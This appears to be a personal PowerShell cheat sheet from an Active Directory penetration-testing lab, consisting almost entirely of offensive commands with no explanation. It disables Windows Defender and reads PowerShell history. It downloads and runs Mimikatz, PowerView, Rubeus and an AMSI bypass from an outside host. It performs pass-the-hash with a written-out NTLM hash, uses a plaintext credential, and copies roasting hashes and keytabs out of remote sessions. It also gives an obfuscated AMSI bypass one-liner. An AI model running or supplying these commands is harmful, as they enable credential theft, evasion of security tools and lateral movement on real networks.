# Essential Powershell


```
Set-MpPreference -DisableRealtimeMonitoring $true
cat C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Set-Item WSMan:\localhost\Client\TrustedHosts *

```

```
iex (iwr -UseBasicParsing http://192.168.100.35/amsi.txt)
iex (iwr -UseBasicParsing http://192.168.100.35/Invoke-Mimikatz.ps1)
iex (iwr -UseBasicParsing http://192.168.100.35/powerview-dev.ps1)
iex (iwr -UseBasicParsing http://192.168.100.35/powerview-dev.ps1)
iex (iwr -UseBasicParsing http://192.168.100.35/Invoke-Mimikatz.ps1)
iex (iwr -UseBasicParsing http://192.168.100.35/Invoke-SMBEnum.ps1)
iwr -UseBasicParsing http://192.168.100.35/rubeus.exe -OutFile rubeus.exe
iwr -UseBasicParsing http://192.168.100.35/Tools/Invoke-Mimikatz.ps1 -OutFile Invoke-Mimikatz.ps1
iwr -UseBasicParsing http://192.168.100.35/ADModule-master.zip -OutFile ADModule-master.zip
Expand-Archive .\ADModule-master.zip
```
#
```
$passwd = ConvertTo-SecureString "Vend0r'sDatabaseSecret" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("msp\mspdb", $passwd)
$mspsqlreport = New-PSSession -Computername msp-sqlreport.msp.local -Credential $creds
Enter-PSSession $mspsqlreport
Invoke-Command -ScriptBlock{hostname} -Computer msp-sqlreport.msp.local -Credential $creds
```



# Download From Target PSSession
```
Set-ItemProperty -Path C:\Ubuntu\rootfs\root\sqlsrv02.keytab -Name Attributes -Value Normal
Set-ItemProperty -Path C:\Users\Administrator\Documents\hashes.asreproast -Name Attributes -Value Normal
Copy-Item -FromSession $sess -Path C:\Users\Administrator\Documents\hashes.asreproast -Destination C:\Users\itemployee35\Desktop\Tools\ -Force

```

# File Upload to target 
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:sqlsvc /domain:it.gcb.local /ntlm:7782d820e5e5952b20b77a2240a03bbc /run:powershell.exe"'

$sess = New-PSSession -ComputerName it-sqlsrv02
Enter-PSSession $sess
Set-MpPreference -DisableRealtimeMonitoring $true
exit


Copy-Item -ToSession $sess .\ADModule-master.zip -Destination C:\Users\sqlsvc\Downloads
Copy-Item -Path C:\Users\itemployee35\Desktop\Tools\SharpView.exe -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 1)
Copy-Item -Path C:\Users\itemployee35\Desktop\Tools\powerview-dev.ps1 -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 1)
Copy-Item -Path C:\Users\itemployee35\Desktop\Tools\PowerUpSQL.ps1 -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 1)
Copy-Item -Path C:\Users\itemployee35\Desktop\Tools\Invoke-SMBEnum.ps1 -Destination C:\Users\Administrator\Documents\ -ToSession (Get-PSSession -id 1)
```


# AMSI Bypass
```
sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

```
